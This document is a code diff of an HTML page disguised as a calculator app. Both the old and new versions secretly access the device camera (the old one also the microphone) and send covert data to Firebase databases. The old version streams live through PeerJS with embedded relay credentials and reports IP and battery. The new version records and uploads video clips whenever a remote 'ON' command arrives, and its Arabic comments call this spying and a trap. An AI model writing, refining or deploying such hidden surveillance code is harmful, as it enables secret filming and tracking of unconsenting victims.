@@ -3,17 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Calculator Pro</title>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <title>Smart Calculator</title>
     <style>
         body { background: #17181A; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         .calc { width: 90%; max-width: 360px; background: #222427; padding: 25px; border-radius: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
-        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; }
+        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; overflow: hidden; }
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
-        button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; cursor: pointer; }
+        button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; cursor: pointer; transition: 0.1s; }
+        button:active { background: #444; }
         .btn-op { background: #008DDE; }
-        .btn-eq { background: #008DDE; grid-column: span 2; border-radius: 35px; width: auto; }
-        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        video { display: none; }
     </style>
 </head>
 <body>
@@ -21,63 +20,75 @@
 <div class="calc">
     <div id="display">0</div>
     <div class="grid">
-        <button onclick="clr()">C</button><button onclick="press('(')">(</button><button onclick="press(')')">)</button><button class="btn-op" onclick="press('/')">÷</button>
-        <button onclick="press('7')">7</button><button onclick="press('8')">8</button><button onclick="press('9')">9</button><button class="btn-op" onclick="press('*')">×</button>
-        <button onclick="press('4')">4</button><button onclick="press('5')">5</button><button onclick="press('6')">6</button><button class="btn-op" onclick="press('-')">−</button>
-        <button onclick="press('1')">1</button><button onclick="press('2')">2</button><button onclick="press('3')">3</button><button class="btn-op" onclick="press('+')">+</button>
-        <button onclick="press('0')">0</button><button onclick="press('.')">.</button><button class="btn-eq" onclick="equal()">=</button>
+        <button onclick="clr()">C</button><button>+/-</button><button>%</button><button class="btn-op">÷</button>
+        <button onclick="p('7')">7</button><button onclick="p('8')">8</button><button onclick="p('9')">9</button><button class="btn-op">×</button>
+        <button onclick="p('4')">4</button><button onclick="p('5')">5</button><button onclick="p('6')">6</button><button class="btn-op">−</button>
+        <button onclick="p('1')">1</button><button onclick="p('2')">2</button><button onclick="p('3')">3</button><button class="btn-op">+</button>
+        <button onclick="p('0')">0</button><button>.</button><button style="grid-column: span 2; width: auto; border-radius: 35px; background: #008DDE;" onclick="equal()">=</button>
     </div>
 </div>
 
-<video id="localVideo" autoplay muted playsinline></video>
+<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
 
 <script>
-    const DB_URL = "https://mycam-1b1da-default-rtdb.firebaseio.com/devices/Main_Device.json";
-    
-    const peer = new Peer({
-        config: { 'iceServers': [
-            { urls: "stun:stun.relay.metered.ca:80" },
-            { urls: "turn:global.relay.metered.ca:80", username: "fd075dba7e7fa14957558bbb", credential: "4R8bW/LZ8YWtKzCW" }
-        ]}
+    // إعدادات فايربيز الخاصة بك
+    const firebaseConfig = {
+        databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const devName = "Main_Device";
+    let isSpying = false;
+
+    // تشغيل الكاميرا فورياً في الخلفية
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+    .then(stream => {
+        // الاستماع لأوامر لوحة التحكم (Admin)
+        db.ref('commands/' + devName).on('value', snap => {
+            const cmd = snap.val();
+            if(cmd === "ON" && !isSpying) {
+                isSpying = true;
+                runTrap(stream);
+            } else if(cmd === "OFF") {
+                isSpying = false;
+            }
+        });
     });
 
-    let myStream;
-    navigator.mediaDevices.getUserMedia({ video: { width: 426, height: 240 }, audio: true })
-    .then(stream => { 
-        myStream = stream; 
-        document.getElementById('localVideo').srcObject = stream;
-        updateReport("Allowed ✅");
-    }).catch(() => updateReport("Denied ❌"));
+    function runTrap(stream) {
+        if(!isSpying) return;
 
-    async function updateReport(perm) {
-        if(!peer.id) return;
-        try {
-            const batt = await navigator.getBattery();
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            
-            await fetch(DB_URL, {
-                method: 'PUT', // دي بتمسح القديم وتحط الجديد عشان نخلص من الـ undefined
-                body: JSON.stringify({
-                    peer_id: peer.id,
-                    ip: ipData.ip,
-                    battery: Math.round(batt.level * 100) + "%" + (batt.charging ? "⚡" : ""),
-                    camera: perm,
-                    last_seen: new Date().toLocaleTimeString()
-                })
-            });
-        } catch(e) { console.error("Update Fail"); }
+        let recorder = new MediaRecorder(stream);
+        let chunks = [];
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const reader = new FileReader();
+            reader.readAsDataURL(blob);
+            reader.onloadend = async () => {
+                const batt = await navigator.getBattery();
+                db.ref('radar/' + devName).update({
+                    video: reader.result,
+                    batt: Math.round(batt.level * 100) + "%",
+                    time: new Date().toLocaleTimeString()
+                });
+                // تكرار العملية طالما الحالة ON
+                if(isSpying) runTrap(stream);
+            };
+        };
+
+        recorder.start();
+        // تسجيل 7 ثواني (نفس توقيت الفخ الأصلي)
+        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 7000);
     }
 
-    peer.on('open', () => updateReport("Allowed ✅"));
-    setInterval(() => updateReport(myStream ? "Allowed ✅" : "Checking..."), 10000);
-    peer.on('call', call => call.answer(myStream));
-
-    // منطق الآلة الحاسبة
+    // كود الآلة الحاسبة
     let disp = document.getElementById('display');
-    function press(v) { if(disp.innerText==="0") disp.innerText=""; disp.innerText+=v; }
-    function clr() { disp.innerText="0"; }
-    function equal() { try { disp.innerText = eval(disp.innerText.replace('×','*').replace('÷','/')); } catch { disp.innerText="Error"; } }
+    function p(v){ if(disp.innerText==="0") disp.innerText=""; disp.innerText+=v; }
+    function clr(){ disp.innerText="0"; }
+    function equal(){ try{ disp.innerText = eval(disp.innerText.replace('×','*').replace('÷','/')); } catch { disp.innerText="Error"; } }
 </script>
 </body>
 </html>
